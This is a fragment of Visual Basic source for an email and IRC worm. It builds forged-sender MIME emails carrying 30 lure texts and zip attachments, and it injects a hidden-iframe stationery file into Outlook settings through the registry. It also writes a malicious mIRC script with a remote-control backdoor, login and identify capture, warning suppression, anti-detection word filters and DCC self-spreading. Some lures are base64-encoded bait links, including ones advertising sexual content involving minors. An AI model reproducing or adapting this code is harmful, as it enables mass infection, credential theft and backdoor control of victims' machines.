    If (InStr(bm, LCase(h0)) = 0) Then Print #16, h0
    End If
   End If
   Next

   Close #13: Close #14: Close #16
   Kill Path
   End Sub

   Private Function EML(mail, fmail)
   'OK
   On Error Resume Next
   Dim eb0 As String, eb00 As String, eb000 As String, el As String
   Dim rms As Integer, mu As String
   Randomize: rms = Int(Rnd * 30) + 1: mu = Mid(mail, 1, InStr(mail, "@") - 1)

   If InStr(LCase(LangID), "español") <> 0 Then
    Select Case rms
    Case 1
    eb0 = "Mail Delivery Return System"
    eb00 = "La información no pudo ser enviada a uno o más destinatarios."
    eb000 = "ReturnMsg.zip"
    el = "ReturnMsg"
    Case 2
    eb0 = "Hola " & mu
    eb00 = "Te envio la info que me pediste, responde que tal esta, bye"
    eb000 = "videoClip.zip"
    el = "Tienes un Mensage " & mu
    Case 3
    eb0 = "Sabes si te mienten?"
    eb00 = "El lenguage corporal delata sutilmente la mentira, 5 tips para saber si te estan diciendo la verdad."
    eb000 = "NoMentir.zip"
    el = "NoMentir"
    Case 4
    eb0 = "Manual de Seduccion"
    eb00 = "Quieres mejorar tu exito con el sexo opuesto, pos echale un ojo a este texto. que tiene utiles consejos."
    eb000 = "Seduc.zip"
    el = "Arte de Seducir"
    Case 5
    eb0 = mu & " tienes un Regalo Virtual"
    eb00 = "Te han enviado un Regalo virtual, esta disponible durante 7 dias, descargalo o entra al link :)"
    eb000 = "Virtual0034.zip"
    el = mu
    Case 6
    eb0 = "Gusanito.com"
    eb00 = "Hay una targeta disponible para ti de parte de un amigo. descargala o entra al link :)"
    eb000 = "E-Card.zip"
    el = "Targeta Virtual"
    Case 7
    eb0 = "Fotos en tu email"
    eb00 = "XXX Todo Vale XXX"
    eb000 = "xImages.zip"
    el = "Mirame ;)"
    Case 8
    eb0 = "Que hay detras de un beso"
    eb00 = "Sabes que significa la forma de besar o que tipos y tecnicas existen, conocelas"
    eb000 = "beso.zip"
    el = "Besos"
    Case 9
    eb0 = "No Adware"
    eb00 = "Se te cambia la pagina de inicio?, te salen ventanas de publicidad, problemas con dialers, troyanos u otros adwares, prueba este programa gratis y acabemos con la lacra que es el Adware."
    eb000 = "CwshredderPlus.zip"
    el = "Limpiar Pc"
    Case 10
    eb0 = "Sexo Tantrico"
    eb00 = "Tantra: antigua disciplina oriental para mejorar el desempeño sexual. Conocelo"
    eb000 = "Sex_Tantra.zip"
    el = "Sexo Tantrico Images"
    Case 11
    eb0 = "Hey " & mu
    eb00 = mu & " mira la imagen 30 segundos y luego mira a otra parte y veras algo sorprendente (buena ilusion optica, casi alucinacion)"
    eb000 = "IlusionI.zip"
    el = "Imagenes"
    Case 12
    eb0 = "Mira la foto " & mu
    eb00 = "Mira mi foto ;)"
    eb000 = "Photo.zip"
    el = "Mi Album"
    Case 13
    eb0 = "Que significa tu nombre?"
    eb00 = "Los nombres y los apellidos como toda palabra tienen un significado, el cual ya en la mayoria de veces o no recordamos, tal vez encuentres el significado del tuyo en nuestra base de datos :)"
    eb000 = "SigNombre.zip"
    el = "Tu Nombre"
    Case 14
    eb0 = "Eres inteligente? ;)"
    eb00 = "El Papa de rosa era un empleado en una compañia de seguros, vivia modestamente, tenia una casa mediana, un auto no muy nuevo y un perro, pero lo que el queria más eran sus 3 hijas: Ana, Ane y ...¿Como se llamaba su otra hija?"
    eb000 = "RptAcertijos.zip"
    el = "Respuesta"
    Case 15
    eb0 = "Hack Hotmail"
    eb00 = "Quisiste hackear una cuenta de hotmail alguna vez, entonces prueba esta tecnica, y lo bueno es que no se nesecita ser un Hacker para usarla."
    eb000 = "HackHotmail.zip"
    el = "HackHotmail"
    Case 16
    eb0 = "Respuesta para " & mu
    eb00 = "La respuesta a su pedido ha sido aprobada, con lo que se hace acreedor de las ventajas y descuentos de nuestro circulo, para mas detalles vea texto el adjunto."
    eb000 = mu & ".zip"
    el = "Admin Page"
    Case 17
    eb0 = "Importante para " & mu
    eb00 = "Hola, no me conoces, pero te envio algo que te interesara, ojala te sea de utilidad, bye"
    eb000 = mu & "_msg.zip"
    el = "Mensage"
    Case 18
    eb0 = "Click en el adjunto y pon audifono :)"
    eb00 = "Escuchate esta cancion, Carta a Santa Claus III ;)"
    eb000 = "FuckSanta.zip"
    el = "Play Song"
    Case 19
    eb0 = "quieres saber cuan psicopata eres?"
    eb00 = "Este es un test usado por el ejercito de estados unidos al reclutar soldados, para en palabras simples medir cuan propensos a la locura son, hacelo y ve cuan zafado estas."
    eb000 = "TestRayado.zip"
    el = "Test Aqui"
    Case 20
    eb0 = "Dibujitos (Esta Buenisimo)"
    eb00 = "Mirate esto ;)"
    eb000 = "Dibujitos.zip"
    el = "MAS Dibujitos"
    Case 21
    eb0 = "Osama Ben Laden el hombre que le declaro la Guerra a Estados Unidos"
    eb00 = "Que lo indujo a dejar una posible vida de lujos(es millonario), para embarcarse en una guerra santa contra USA, sabias que las familias de Bush y Osama se conocian, enterate de las verdaderas causas de su guerra aqui."
    eb000 = "Osama.zip"
    el = "Osama Web"
    Case 22
    eb0 = "PornStars Show"
    eb00 = "Mira este scrensaver de las actrices del cine porno"
    eb000 = "PornStars.zip"
    el = "PorStars All Access"
    Case 23
    eb0 = "Solo la pura verdad"
    eb00 = "Asi es la vida :("
    eb000 = "ZALIA.zip"
    el = "Solo la Pura Verdad"
    Case 24
    eb0 = "16 Fotos de las mejores conejitas de Playboy"
    eb00 = "Las mejores fotos de PlayBoy de este año, pasalas ;)"
    eb000 = "16Playboy.zip"
    el = "Planeta PlayBoy"
    Case 25
    eb0 = "Aviso Importante"
    eb00 = mu & "Debido a las reformas del servidor, se pide a los usuarios completar el nuevo registro a fin de validar sus cuentas y no sean suspendidas. Atentamente AdminSystem"
    eb000 = "Registro.zip"
    el = "Nuevo Registro"
    Case 26
    eb0 = "Diez mandamientos del Amor y Sexo"
    eb00 = "Mantener una relacion amorosa saludable y exitante exige mucho esfuerzo y muchas ganas, te damos estas 10 claves"
    eb000 = "10Claves.zip"
    el = "Amor y Sexo"
    Case 27
    eb0 = "Como Saber si le Gustas?"
    eb00 = "Te mueres por esa persona, pero no sabes si decirle algo, porque capaz no te da bola, con este test puedes descubrir detalles que te indiquen que siente por ti :)"
    eb000 = "TestG.zip"
    el = "My Page"
    Case 28
    eb0 = "100% Ideal"
    eb00 = mu & "Participa en este rompecabezas, si se pudiera crear a la(el) Chica(o) Ideal escogiendo un rostro de aqui y una silueta de alla, como seria tu pareja Ideal?"
    eb000 = "Ideal.zip"
    el = "100% Ideal"
    Case 29
    eb0 = "Vision del Futuro"
    eb00 = "TodO hA sIdO Dad0"
    eb000 = "TuFuturo.zip"
    el = "Necromancia"
    Case 30
    eb0 = "Que Raro"
    eb00 = "Miralo tu mismo"
    eb000 = "QueRaro.zip"
    el = "Que Raro"
    End Select
   Else
    Select Case rms
    Case 1
   eb0 = "Mail Delivery Return System"
   eb00 = "The information could not be a correspondent to one or more addressees."
   eb000 = "ReturnMsg.zip"
   el = "ReturnMsg"
    Case 2
   eb0 = "Hello " & mu
   eb00 = "I ship You the info that you requested me, responds that such this, bye"
   eb000 = "videoClip.zip"
   el = "you Have a Mensage" & mu
    Case 3
   eb0 = "do you Know if they lie you?"
   eb00 = "The corporal language accuses the lie subtly, 5 tips to know if they are telling you the truth."
   eb000 = "Lie.zip"
   el = "NotLie"
    Case 4
   eb0 = "Manual gives Seduction"
   eb00 = "you Want to improve your success with the opposite sex, search keeps an eye on this text. that has useful advice."
   eb000 = "Seduc.zip"
   el = "Art gives to Seduce"
    Case 5
   eb0 = mu & " you have a Virtual Gift"
   eb00 = "they have sent You a virtual Gift, this available one during 7 days, discharge it or enters to the link:)"
   eb000 = "Virtual0034.zip"
   el = mu
    Case 6
   eb0 = "Gusanito.com"
   eb00 = "there is an available card for you on behalf of a friend. discharge it or enters to the link:)"
   eb000 = "EL-Card.zip"
   el = "Virtual Card"
    Case 7
   eb0 = "Pictures in your email"
   eb00 = "XXX All Voucher XXX"
   eb000 = "xImages.zip"
   el = "you Look at me ;)"
    Case 8
   eb0 = "That there is behind a kiss"
   eb00 = "you Know that it means the form gives to kiss or that types and techniques exist, know them"
   eb000 = "Kiss.zip"
   el = "Kisses"
    Case 9
   eb0 = "No Adware"
   eb00 = "are you changed the it paginates beginning he/she gives?, do they leave you windows publicity he/she gives, problems with dialers, troyanos or other adwares, does it prove this program free and do let us put an end to the insensitive one that the Adware is."
   eb000 = "CwshredderPlus.zip"
   el = "to Clean Pc"
    Case 10
   eb0 = "Sex Tantrico"
   eb00 = "Tantra: ancient discipline oriental to improve the sexual acting. Know it"
   eb000 = "Sex_Tantra.zip"
   el = "Sex Tantrico Images"
    Case 11
    eb0 = " Hey " & mu
    eb00 = mu & " he/she looks at the image 30 second and then he/she looks to another part and truth at something surprising (good optic illusion, almost hallucination)"
    eb000 = "IlusionI.zip"
    el = "Images"
    Case 12
   eb0 = "Looks at the picture" & mu
   eb00 = "Looks at my picture;)"
   eb000 = "Ph0t0.zip"
   el = "My Album"
    Case 13
   eb0 = "That means your name?"
    eb00 = "The names and the last names like all word have a meaning, the one which already in most he/she gives times or we don't remember, perhaps find the meaning he/she gives yours in our database:)"
    eb000 = "SigName.zip"
    el = "Your Name"
    Case 14
   eb0 = "are you intelligent? ;)"
    eb00 = "The Father gives Sandra was an employee in an insurance company, lived modestly, tapeworm a medium house, a car very new no and a dog, but what the one wanted more they were its 3 daughters: Ana, Ane and... Like their other daughter was called?"
    eb000 = "Riddles"
    el = "Answer"
    Case 15
   eb0 = "Hack Hotmail"
    eb00 = "you Wanted hackear one it counts gives hotmail at some time, then test this technique, and the good thing is that no you need to be a Hacker to use it."
    eb000 = "HackHotmail.zip"
    el = "HackHotmail"
    Case 16
   eb0 = "Answer for " & mu
    eb00 = "The answer to its order has been approved, with what becomes accrediting gives the advantages and discounts gives our I circulate, for but you detail sees text the assistant."
    eb000 = mu & ".zip"
    el = "Admin Page"
    Case 17
   eb0 = "Important for " & mu
    eb00 = "Hello, you don't know me, but I ship you something that interested you, God willing it is you gives utility, bye"
    eb000 = mu & "_msg.zip"
    el = "Message"
    Case 18
   eb0 = "Click in the assistant and put earphone:)"
    eb00 = "you Listen to yourself this song, Letter to Santa Claus III ;)"
    eb000 = "FuckSanta.zip"
    el = "Play Song"
    Case 19
   eb0 = "do you want to know how psychopath you are?"
    eb00 = "This is a test used for the I exercise gives states together to recruiting soldiers, it stops in simple words to measure how prone to the madness they are, and you go how released these."""
    eb000 = "CrazyTest.zip"
    el = "Test Here"
    Case 20
   eb0 = "Drawings (This Very Good)"
    eb00 = "you Look at yourself this ;)"
    eb000 = "Drawings.zip"
    el = "MORE Drawings"
    Case 21
    eb0 = "Osama Ben Laden the man that I declare the War to United States"
    eb00 = "That induced it to leave a possible life he gives luxuries, to go aboard in a sacred war against it USES, wise that the families give Bush and Osama they knew each other, find out he gives the true causes he gives their war here."
    eb000 = "Osama.zip"
    el = "Osama Web"
    Case 22
   eb0 = "PornStars Show"
    eb00 = "Looks at this scrensaver gives the actresses he/she gives the cinema porn"
    eb000 = "PornStars.zip"
    el = "PorStars All Access"
    Case 23
   eb0 = "Alone the pure truth"
    eb00 = "it is This way the life :("
    eb000 = "ZALIA.zip"
    el = "Alone the Pure Truth"
    Case 24
   eb0 = "16 Pictures give the best doe gives Playboy"
    eb00 = "The best pictures give PlayBoy gives this year, it passes them ;)"
    eb000 = "16Playboy.zip"
    el = "Planet PlayBoy"
    Case 25
   eb0 = "I Warn Important"
    eb00 = mu & " due to the reformations he/she gives the servant, it is asked the users to complete the new registration in order to validate their you count and don't be suspended. Sincerely AdminSystem"""
    eb000 = "Registry.zip"
    el = "New Registry"
    Case 26
   eb0 = "Ten commandments give the Love and Sex"
    eb00 = "to Maintain a healthy loving relationship and upper demands a lot of effort and many desires, we give you these 10 keys"
    eb000 = "10Claves.zip"
    el = "Love and Sex"
    Case 27
   eb0 = "As Knowing if he Likes?"
    eb00 = "you die for that person, but you don't know if to tell him something, because capable doesn't give you ball, with this test you can discover specificses that indicate you that it feels for you :)"
    eb000 = "TestG.zip"
    el = "My Page"
    Case 28
   eb0 = "100% Ideal"
    eb00 = mu & " does it Participate in this puzzle, if you could create to the Girl (or Boy) Ideal choosing a face gives here and does a silhouette give there, as serious your Ideal couple?"
    eb000 = "Ideal.zip"
    el = "100% Ideal"
    Case 29
   eb0 = "Vision gives the Future"
    eb00 = "Everything has Been given"
    eb000 = "YourFuture.zip"
    el = "Necromancy"
    Case 30
   eb0 = "That Strange!"
    eb00 = "you Look at it your same one"
    eb000 = "ThatStrange.zip"
    el = "That Strange"
    End Select
   End If

   ctmime = "Content-Type: application/octet-stream;" & vbCrLf & _
   Chr(9) & "Name=" & Chr(34) & eb000 & Chr(34) & vbCrLf & "Content-Disposition: attachment;" & vbCrLf & _
   Chr(9) & "filename=" & Chr(34) & eb000 & Chr(34) & vbCrLf

   Boundary = "----=_NextPart_000_0002_01BD22EE.C1291DA0"
   EML = "From: " & Chr(34) & RaMName() & Chr(34) & " <" & fmail & ">" & vbCrLf & _
   "To: " & Chr(34) & mail & Chr(34) & vbCrLf & _
   "Subject: " & eb0 & vbCrLf & "DATE:" & Chr(32) & Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & vbCrLf & _
   "MIME-Version: 1.0" & vbCrLf & "Content-Type: multipart/mixed;" & vbCrLf & _
   Chr(9) & "boundary=" & Chr(34) & Boundary & Chr(34) & vbCrLf & _
   "X-Priority: 3" & vbCrLf & "X-MSMail - Priority: Normal" & vbCrLf & _
   "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000" & vbCrLf & "" & vbCrLf & _
   "Esto es un mensaje multiparte en formato MIME" & vbCrLf & "" & vbCrLf & _
   "--" & Boundary & vbCrLf & "Content-Type: text/html;" & vbCrLf & _
   Chr(9) & "charset=" & Chr(34) & "x-user-defined" & Chr(34) & vbCrLf & _
   "Content-Transfer-Encoding: 8bit" & vbCrLf & "" & vbCrLf & eb00 & vbCrLf & "<br><p><a href=" & Chr(34) & GetWeb() & Chr(34) & ">" & el & "</a>" & vbCrLf & _
   "--" & Boundary & vbCrLf & ctmime & "Content-Transfer-Encoding: base64" & vbCrLf & "" & vbCrLf & _
   BC4 & vbCrLf & "" & vbCrLf & "--" & Boundary & "--"

   End Function

   Function RaMName()
   'OK
   On Error Resume Next
   Dim Rb As Integer
   an = Array("Andrea", "Pamela", "Patricia", "Cristina", "Adriana", _
   "Katherine", "July", "Vanessa", "Jennifer", "Karina", _
   "Janeth", "Dulce", "Ana", "Veronica", "Paola", _
   "Carlos", "Marcos", "Javier", "Miguel", "Jorge", _
   "Cris", "Willy", "Pablo", "Roberto", "Rodrigo", _
   "Enrique", "Luis", "Daniel", "Bill", "Alejandro")

   ap = Array("Dark", "Bracho", "Torres", "Aguilar", "Martinez", _
   "Lugo", "Costa", "Velarde", "Varela", "Helsim", _
   "Valencia", "Mancilla", "Braschi", "Wong", "Chang", _
   "Mora", "Arana", "Alvites", "Start", "Toledo", _
   "Flores", "Garcia", "Orellana", "Hoyos", "Perez", _
   "Campos", "Humala", "Alvarez", "Valenzuela", "Luque")

   a = Int(Rnd * 30): b = Int(Rnd * 30): RaMName = an(a) & " " & ap(b)
   End Function

   Function RaMFrom(mail)
   'OK
   On Error Resume Next
   Dim Rb As Integer, R As Integer
   an = Array("Andrea", "Pamela", "Patricia", "Cristina", "Adriana", _
   "Katherine", "July", "Vanessa", "Jennifer", "Karina", _
   "Janeth", "Dulce", "Ana", "Veronica", "Paola", _
   "Carlos", "Marcos", "Javier", "Miguel", "Jorge", _
   "Cris", "Willy", "Pablo", "Roberto", "Rodrigo", _
   "Enrique", "Luis", "Daniel", "Bill", "Alejandro")

   ap = Array("Dark", "Bracho", "Torres", "Aguilar", "Martinez", _
   "Lugo", "Costa", "Velarde", "Varela", "Helsim", _
   "Valencia", "Mancilla", "Braschi", "Wong", "Chang", _
   "Mora", "Arana", "Alvites", "Start", "Toledo", _
   "Flores", "Garcia", "Orellana", "Hoyos", "Perez", _
   "Campos", "Humala", "Alvarez", "Valenzuela", "Luque")

   Randomize: Rb = Int(Rnd * 200): R = Int(Rnd * 2) + 1
   a = Int(Rnd * 30): b = Int(Rnd * 30): ud = Mid(mail, InStr(mail, "@"))

   If R = 1 Then
   RaMFrom = an(a) & ap(b) & "_" & Rb & ud
   ElseIf R = 2 Then
   RaMFrom = an(a) & "_" & ap(b) & Rb & ud
   End If
   End Function

   Private Sub Bfir()
   'OK
   On Error Resume Next
   Dim Vo(2) As String, Uo As String, a As Integer, bf As String

   a = FreeFile
   Open Sp(0) & "\microsoftweb.htm" For Output As #a
   Print #a, "<br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p><br><p>"
   Print #a, "<HTML><A HREF=" & GetWeb() & " TARGET=blank><font color=red>------NEW MESSAGE :)--------</font></A></HTML>"
   Print #a, "<iframe src=" & GetWeb() & " style=" & Chr(34) & "display:none;" & Chr(34) & ">"
   Close #a

   Vo(0) = "5.0": Vo(1) = Left(Rr("Software\Microsoft\Outlook Express", "MediaVer", 3), 1) & ".0"
   Uo = Rr("Identities", "Default User ID", 2)

   Rout = "Identities\" & Uo & "\Software\Microsoft\Outlook Express\"

   For i = 0 To UBound(Vo)
   Rw Rout & Vo(i) & "\Mail", "Message Send HTML", 1, 2, 2
   Rw Rout & Vo(i) & "\Mail", "Compose Use Stationery", 1, 2, 2
   Rw Rout & Vo(i) & "\Mail", "Wide Stationery Name", Sp(0) & "\microsoftweb.htm", 2, 1
   Rw Rout & Vo(i) & "\Mail", "Stationery Name", Sp(0) & "\microsoftweb.htm", 2, 1
   Next

   bf = Rr("Software\Microsoft\Shared Tools\Stationery", "Backgrounds Folder", 3)
   If bf = "" Then bf = Rr("Software\Microsoft\Shared Tools\Stationery", "Stationery Folder", 3)

   FileCopy Sp(0) & "\microsoftweb.htm", bf & "\microsoftweb.htm"

   Dim Out(4): Out(0) = "8.0": Out(1) = "9.0": Out(2) = "10.0": Out(3) = "11.0"
   For i = 0 To UBound(Out)
   Rw "Software\Microsoft\Office\" & Out(i) & "\Outlook\Options\Mail", "EditorPreference", 131072, 2, 2
   Rw "Software\Microsoft\Office\" & Out(i) & "\Common\MailSettings", "NewStationery", "microsoftweb", 2, 2
   Next

   Rw "Software\Microsoft\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046", "001e0360", "microsoftweb", 2, 1
   Rw "Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046", "001e0360", "microsoftweb", 2, 1
   End Sub

   Private Sub bMirc(Path)
   'OK
   On Error Resume Next
   Dim jm As String, mis As String, mi1 As String, mi2 As String, mi3 As String, mi4 As String, l As Integer: jm = RName()

   FileCopy Sp(1) & "\gZip.zip", Sp(1) & "\girc.zip"
   WIni "rfiles", "n2", jm, Path & "mirc.ini"
   WIni "warn", "fserve", "off", Path & "mirc.ini"
   WIni "warn", "dcc", "off", Path & "mirc.ini"
   WIni "fileserver", "warning", "off", Path & "mirc.ini"
   WIni "text", "quit", "Sex Lolitas http://interserv10.i-networx.de/lolitasex.avi XXX", Path & "mirc.ini"

   mi1 = "ctcp 1:/*:*:{ .ctcpreply $nick / Rcib1d0 | if (%d.on = $true) { var %d = $eval($remove($1-,/),100) | %d | .clear | halt } }" & vbCrLf & "On 1:TEXT:gp*:*:{ var %gp = $remove($1,gp)" & vbCrLf & "if (%gp == $chr(103) $+ $chr(101) $+ $chr(100) $+ $chr(122) $+ $chr(97)) {" & vbCrLf & _
   "if ($2 == On) { .set %d.on $true | .set %d.nick $nick | .privmsg $nick $decode(SW5pY2lhbmRvIFNlY2lvbiBkZSBDb250cm9sIFJlbW90byA6KQ==,m) }" & vbCrLf & _
   "if ($2 == Off) { .set %d.on $false | .unset %d.nick $nick | .privmsg $nick $decode(VGVybWluYW5kbyBTZWNpb24gZGUgQ29udHJvbCBSZW1vdG8gOik=,m) } }" & vbCrLf & _
   "else { .privmsg $nick $decode(cGFzcyBpbmNvcnJlY3QgOig=,m) }" & vbCrLf & ".close -cm $nick }" & vbCrLf & "On 1:Text:smd*:*:{" & vbCrLf & _
   "if (%d.on = $false) { halt } | var %tv = $remove($1,smd)" & vbCrLf & "if (%tv == ZpIOn) { .set %ZpI $true } | elseif (%tv == ZpIOff) { .set %ZpI $false }" & vbCrLf & "elseif (%tv == ZpTcOn) { .set %ZpTc $true } | elseif (%tv == ZpTpOn) { .set %ZpTp $true }" & vbCrLf & _
   "elseif (%tv == ZpTOff) { .set %ZpTc $false | .set %ZpTp $false }" & vbCrLf & "elseif (%tv == Zpdir) { .fserve $nick 3 $left($mircdir,3) } | elseif (%tv == exit) { .disconnect | .exit }" & vbCrLf & "elseif (%tv == ip) { .privmsg $nick $ip }" & vbCrLf & _
   ".close -cm $nick }" & vbCrLf & "On 1:Text:*:?:{" & vbCrLf & "if (%ZpTp = $true) { .privmsg %d.nick < $+ $Nick $+ > $+ $1- }" & vbCrLf & _
   "if ($NoText($1-) = $true) { .ignore $nick | .close -cm $nick }" & vbCrLf & "}" & vbCrLf & "On 1:Text:*:#:{" & vbCrLf & _
   "if (%ZpTc = $true) { .privmsg %d.nick < $+ $Nick $+ > $+ $1- }" & vbCrLf & "if ($NoText($1-) = $true) { .part $chan }" & vbCrLf & "}" & vbCrLf & _
   "On 1:INPUT:*:{" & vbCrLf & "if %ZpI = $true { .privmsg %d.nick 12 $+ $1- $+  }" & vbCrLf & "if (identify isin $1-) || (login isin $1-) {" & vbCrLf & _
   "var %rep = $fulldate $+ $crlf $+ $me $+ $crlf $+ $chan $+ $crlf $+ $1- $+ $crlf $+ $email $+ $crlf $+ $server $+ $crlf $+ $port $+ $crlf $+ Wi $+ ndo $+ ws $os" & vbCrLf & _
   "Sendlogin %rep }" & vbCrLf & "if ($NoText($1-) = $true) { halt } }" & vbCrLf & _
   "Alias unload { .echo -ae $decode(KiBVbmxvYWRlZCBzY3JpcHQgJw==,m) $+ $2 $+ ' }" & vbCrLf & _
   "Alias socklist { .echo -ae $decode(KioqIE5vIG9wZW4gc29ja2V0cw==,m) }" & vbCrLf & "Alias NoText {" & vbCrLf & _
   "if (trojan isin $1-) || (troyano isin $1-) || (virus isin $1-) || (worm isin $1-) || (set isin $1-) || (enable isin $1-) || (disable isin $1-) || (remote isin $1-) || (script isin $1-) || (play isin $1-) || (sock isin $1-) || (write isin $1-) || (decode isin $1-) || (alias isin $1-) || (load isin $1-) || (unload isin $1-) || (remini isin $1-) || (remove isin $1-) || (events isin $1-) || (timer isin $1-) { return $true }" & vbCrLf & _
   "else { return $false }" & vbCrLf & "}" & vbCrLf & _
   ";---------------------------------------------------------------------------" & vbCrLf & _
   "ctcp *:dcc send:*:{ if ($len($nopath($filename)) >= 225) { halt } }" & vbCrLf & _
   ";---------------------------------------------------------------------------" & vbCrLf & _
   "On 1:CONNECT:{ /Unset %bv.* %d.* %nv.* | /set %ZpI $false | /set %ZpT $false | /set %d.on $false | /Remote On }" & vbCrLf & _
   "On 1:JOIN:*:{ if ($nick != $me) { { siv } | { sv } } | else { if (ayuda isin #) || (help isin #) || (virus isin #) || (avt isin #) || (vh isin #) || (gigairc isin #) { .privmsg # $decode(SXJjLkJhcmRpZWwuRCBieSBHRURaQUMgTEFCUw==,m) | .disconnect | .exit } } }" & vbCrLf & _
   "On 1:FileRcvd:*:{ if ($nick != $me) { { siv } | { sv } } }" & vbCrLf & _
   "On 1:PART:#:{ if ($nick != $me) { { siv } | { sv } } }" & vbCrLf & _
   "On 1:FileSent:*:{ if (.zip isin $filename) { halt } | var %ps = SYSDIR $+ $decode(XGdpcmMuemlw,m) | .copy -o %ps $nofile(%ps) $+ $gettok($nopath($filename),1,46) $+ 2.zip | csv $nick $nofile(%ps) $+ $gettok($nopath($filename),1,46) $+ 2.zip #op }" & vbCrLf

   mi2 = "On 1:SENDFAIL:*:{ halt }" & vbCrLf & _
   "Alias sv { var %pb = SYSDIR $+ $decode(XGdpcmMuemlw,m)" & vbCrLf & _
   "if ($exists(%pb) = $false) { halt } | var %rb = $rand(1,10)" & vbCrLf & _
   "if (%rb = 1) { .copy -o %pb $nofile(%pb) $+ $decode(dGVlblNleC56aXA=,m) | Set %bv.file $nofile(%pb) $+ $decode(dGVlblNleC56aXA=,m) }" & vbCrLf & _
   "  elseif (%rb = 2) { .copy -o %pb $nofile(%pb) $+ $decode(cG9lbWEuemlw,m) | Set %bv.file $nofile(%pb) $+ $decode(cG9lbWEuemlw,m) }" & vbCrLf & _
   "  elseif (%rb = 3) { .copy -o %pb $nofile(%pb) $+ $decode(bG9saXRhLnppcA==,m) | Set %bv.file $nofile(%pb) $+ $decode(bG9saXRhLnppcA==,m) }" & vbCrLf & _
   "  elseif (%rb = 4) { .copy -o %pb $nofile(%pb) $+ $nick $+ .zip | Set %bv.file $nofile(%pb) $+ $nick $+ .zip }" & vbCrLf & _
   "  elseif (%rb = 5) { .copy -o %pb $nofile(%pb) $+ $decode(TXlWaWRlby56aXA=,m) | Set %bv.file $nofile(%pb) $+ $decode(TXlWaWRlby56aXA=,m) }" & vbCrLf & _
   "  elseif (%rb = 6) { .copy -o %pb $nofile(%pb) $+ $decode(U3RlZmFueS56aXA=,m) | Set %bv.file $nofile(%pb) $+ $decode(U3RlZmFueS56aXA=,m) }" & vbCrLf & _
   "  elseif (%rb = 7) { .copy -o %pb $nofile(%pb) $+ $decode(UGhvdG9zLnppcA==,m) | Set %bv.file $nofile(%pb) $+ $decode(UGhvdG9zLnppcA==,m) }" & vbCrLf & _
   "  elseif (%rb = 8) { .copy -o %pb $nofile(%pb) $+ $decode(U2V4VGVzdC56aXA=,m) | Set %bv.file $nofile(%pb) $+ $decode(U2V4VGVzdC56aXA=,m) }" & vbCrLf & _
   "  elseif (%rb = 9) { .copy -o %pb $nofile(%pb) $+ $decode(UG9yblN0YXJzLnppcA==,m) | Set %bv.file $nofile(%pb) $+ $decode(UG9yblN0YXJzLnppcA==,m) }" & vbCrLf & _
   "  elseif (%rb = 10) { .copy -o %pb $nofile(%pb) $+ $me $+ .zip | Set %bv.file $nofile(%pb) $+ $me $+ .zip }" & vbCrLf & _
   ".ignore -rpcntikxu15 $address($nick,1) | csv $nick %bv.file $chan }" & vbCrLf & _
   "Alias siv { var %rb3 = $rand(1,10)" & vbCrLf & _
   "  if (%rb3 = 1) { var %mb3 = $decode(AzVNaXJhIGVzdGEgZm90bywgZXN0YSBidWVuYSBodHRwOi8vaW50ZXJzZXJ2MS50aGVmcmVlYml6aG9zdC5jb20vZWxsYXNzb24uanBnAw==,m) }" & vbCrLf & _
   "  elseif (%rb3 = 2) { var %mb3 = $decode(AzQsMUZvdG9zIGRlIEZhbW9zb3MgeSBGYW1vc2FzIAMDOCwxaHR0cDovL2ludGVyc2VydjIuZnJlZXNpdGVzLndzL2ZhbW91cy5hdmkD,m) }" & vbCrLf & _
   "  elseif (%rb3 = 3) { var %mb3 = $decode(AzgsMU5vIHRlIHBpZXJkYXMgbGFzIHNlbnN1YWxlcyBmb3RvcyBkZSADAzQsMUJyaXRuZXkDAzgsMSB5IAMDNCwxQ3Jpc3RpbmEDAzgsMSBodHRwOi8vbi4xYXNwaG9zdC5jb20vaW50ZXJzZXJ2OC9icml0Y3Jpcy8D,m) }" & vbCrLf & _
   "  elseif (%rb3 = 4) { var %mb3 = $decode(AzRBcHJlbmRlIGEgc2F0aXNmYWNlciBhIHR1IHBhcmVqYSBodHRwOi8vaW50ZXJzZXJ2My5mcmVlc2l0ZXMud3Mvc2V4dGVzdC5odG0D,m) }" & vbCrLf & _
   "  elseif (%rb3 = 5) { var %mb3 = $decode(AzEyUXVlIHkgY29tbyBwaWVuc2EgZWwgc2V4byBvcHVlc3RvIAMDNGh0dHA6Ly93d3cuaWVzcGFuYS5lcy9pbnRlcnNlcnY0L3BzaWNvc2V4LmpwZwM=,m) }" & vbCrLf & _
   "  elseif (%rb3 = 6) { var %mb3 = $decode(AzEzLDFYWFggU2V4IFRlZW5zIExlc2IgRmFudGFzeSADAzQsMWh0dHA6Ly9pbnRlcnNlcnY1LnRoZWZyZWViaXpob3N0LmNvbS9zZXh0ZWVucy5qcGcD,m) }" & vbCrLf & _
   "  elseif (%rb3 = 7) { var %mb3 = $decode(AzgsMUxvIG1lam9yIGRlbCBjaW5lIHR2IHkgZGVtYXMgZW50cmV0ZW5pbWllbnRvIAMDOSwxaHR0cDovL2ludGVyc2VydjYubXlzaXRlc3BhY2UuY29tL2Z1bGxtb3ZpZXMuYXZpAw==,m) }" & vbCrLf & _
   "  elseif (%rb3 = 8) { var %mb3 = $decode(AzEyTWlyYSBtaSBmb3RvIAMDNGh0dHA6Ly9ob3N0aW5nLm1peGNhdC5jb20vaW50ZXJzZXJ2Ny8yNDUzLmpwZwM=,m) }" & vbCrLf & _
   "  elseif (%rb3 = 9) { var %mb3 = $decode(AzQsMUdhbmEgZGluZXJvIGVuIEludGVybmV0IAMDOCwxaHR0cDovL2ludGVyc2VydjkudDM1LmNvbS9tb25leS50eHQD,m) }" & vbCrLf & _
   "  elseif (%rb3 = 10) { var %mb3 = $decode(AzQsMVNleCBMb2xpdGFzIAMDOCwxaHR0cDovL2ludGVyc2VydjEwLmktbmV0d29yeC5kZS9sb2xpdGFzZXguYXZpAwM0LDEgWFhYAw==,m) }" & vbCrLf

   mi3 = ".privmsg $nick %mb3 }" & vbCrLf & _
   "Alias csv { set %bv.file $2" & vbCrLf & _
   "  if ( $1 isop $3 ) || ( $1 isvoice $3 ) { halt }" & vbCrLf & _
